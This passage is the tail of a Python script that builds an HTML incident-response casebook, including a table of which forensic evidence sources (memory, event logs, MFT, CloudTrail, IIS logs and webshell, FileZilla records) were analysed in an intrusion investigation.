
### Evidence coverage
| Artifact | Analyzed | Notes |
|---|---|---|
| SVR01 memory (16 GB) | Full | info/pslist/pstree/cmdline/netscan/malfind/hashdump/vadinfo |
| DC01/DC02 Security | Full | 110k / 217k rows |
| DC01 System | Full | 7045 service installs confirmed |
| WS01/WS02 all evtx | Full | 926k / 827k rows incl. Sysmon |
| SVR01 Sysmon | Full | 538k rows |
| IIS W3SVC logs | Full | u_ex260308.log |
| IIS webshell | Full | so.aspx read directly |
| MFT all hosts | Full | .bWqQUx / IamBatman / tools confirmed |
| CloudTrail | Full | 36,938 events |
| FileZilla XML | Full | exfil dest confirmed |
| GuardDuty | Full | 18 non-sample real findings |
| DC02 PS profile | NOT FOUND | MFT entry 114360 present but file not in KAPE collection |
| IIS Sysmon | NOT PARSED | nltest / Solarwinds.exe / EID 7036 — requires future pass |
| DC02 NTUSER.DAT | PARTIAL | AdvIPScanner presence confirmed; scan range value not retrieved |
| Shellbags (WS02) | NOT PARSED | UsrClass.dat present |
| EID 5145 | NOT PARSED | DonPAPI / ntds SMB access timestamps |
"""), "#475569")}

  </div><!-- .main -->
</div><!-- .layout -->
"""

    html_doc = f"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Casebook — {html.escape(CASE_ID)} — DFIR</title>
<style>{STYLE}</style>
</head>
<body>

<div class="topbar">
  <span class="case-badge">Protocol SIFT</span>
  <h1>JackofAllHacks — Intrusion Investigation Casebook</h1>
  <span class="ts">Generated {generated} &nbsp;|&nbsp; Case ID: {html.escape(CASE_ID)}</span>
</div>

{body_html}

<script>{JS}</script>
</body>
</html>
"""
    out_path = os.path.join(CASE_DIR, out_path)
    with open(out_path, "w", encoding="utf-8") as f:
        f.write(html_doc)
    return out_path

# ── main ──────────────────────────────────────────────────────────────────────

if __name__ == "__main__":
    ap = argparse.ArgumentParser()
    ap.add_argument("--out", default=f"casebook{CASE_ID}.html")
    args = ap.parse_args()
    path = build(args.out)
    size = os.path.getsize(path)
    print(f"[OK] Casebook written: {path}  ({size:,} bytes)")
